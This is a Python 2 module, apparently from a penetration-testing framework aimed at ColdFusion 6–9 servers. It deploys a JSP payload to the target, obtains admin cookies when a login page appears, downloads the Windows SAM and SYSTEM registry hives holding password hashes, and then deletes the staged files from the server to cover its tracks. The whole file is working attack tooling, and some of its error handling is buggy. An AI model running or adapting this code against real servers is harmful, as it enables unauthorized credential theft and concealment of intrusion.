from src.platform.coldfusion.interfaces import CINTERFACES
from src.platform.coldfusion.authenticate import checkAuth
from log import LOG
from auxiliary import Auxiliary
from os import getuid
import deployer
import utility


class Auxiliary:

    def download_file(self, url, fname):
        local_filename = fname
        try:
            r = utility.requests_get(url, stream=True)
            utility.Msg("Attempting to retrieve %s as " + fname % r, LOG.DEBUG)
            with open(local_filename, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
                        f.flush()
            return local_filename
        except Exception, e:
            utility.Msg("Reponse code:" + r.code, LOG.DEBUG)
            utility.Msg("Error downloading the " + fname + " file: %s" % e, LOG.ERROR)

    def Cleanup(self, fingerengine, fingerprint, sam, sys):
        url = "http://{0}:{1}/CFIDE/getSAM.jsp?del={2}&del2={3}".format(
            fingerengine.options.ip, fingerprint.port, sam, sys)

        try:
            utility.Msg("Attempting delete at " + url, LOG.DEBUG)
            response = utility.requests_get(url)
        except Exception, e:
            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
            utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
            return

        if response.status_code == 200:
            utility.Msg("Files cleaned up from server.", LOG.SUCCESS)
        else:
            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
            utility.Msg("We might not have cleaned the files up correctly", LOG.ERROR)

    def __init__(self):
        self.name = 'Obtain Sam and System Registry hives.'
        self.versions = ["6.0", "7.0", "8.0", "9.0"]
        self.show = True
        self.flag = 'cf-sam'

    def check(self, fingerprint):
        if fingerprint.title == CINTERFACES.CFM and \
           fingerprint.version in self.versions:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        if getuid() > 0:
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        fingerengine.options.deploy = "./src/lib/getSAM.jsp"
        deployer.run(fingerengine)

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = "/CFIDE/administrator/reports/index.cfm"
        url = "http://{0}:{1}/CFIDE/getSAM.jsp".format(
            fingerengine.options.ip, fingerprint.port)

        utility.Msg("Checking if successfully deployed and executed...")

        try:
            response = utility.requests_get(url)
        except Exception, e:
            utility.Msg("Reponse code:" + response.code + " for " + url, LOG.DEBUG)
            utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
            return

        #Might not keep this check here....
        if response.status_code == 200 and "ColdFusion Administrator Login" \
                                 in response.content:

            utility.Msg("Host %s:%s requires auth, checking..." %
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)

            if cookies:
                response = utility.requests_get(base + uri, cookies=cookies[0])
            else:
                utility.Msg("Could not get auth for %s:%s" %
                               (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return

        if response.status_code == 200:
            utility.Msg("Deploy worked. Getting the files...", LOG.DEBUG)
            filenames = response.text
            if len(filenames) != 0:
                samfile = filenames.split("<")[0]
                samfile = samfile.translate(None, ' \n')
                samfile = samfile.rstrip()
                systemf = filenames.split(">")[1]
                systemf.translate(None,' \n')
                systemf = systemf.rstrip()

                utility.Msg("Data in response, attempting to retrieve hashes.", LOG.DEBUG)

                urlsam = "http://{0}:{1}/getSAM/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, samfile)
                self.download_file(urlsam, "SAM")

                urlsys = "http://{0}:{1}/getSAM/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, systemf)
                self.download_file(urlsys, "System")
                utility.Msg("Downloaded SYSTEM/SAM to local directory.", LOG.SUCCESS)

                self.Cleanup(fingerengine, fingerprint, samfile, systemf)

        else:
            utility.Msg("Reponse code:" + response.code, LOG.DEBUG)
            #utility.Msg("Response data:\n" + response.text, LOG.DEBUG)
            utility.Msg("Seems the module didn't deploy correctly...", LOG.ERROR)

        fingerengine.options.deploy = None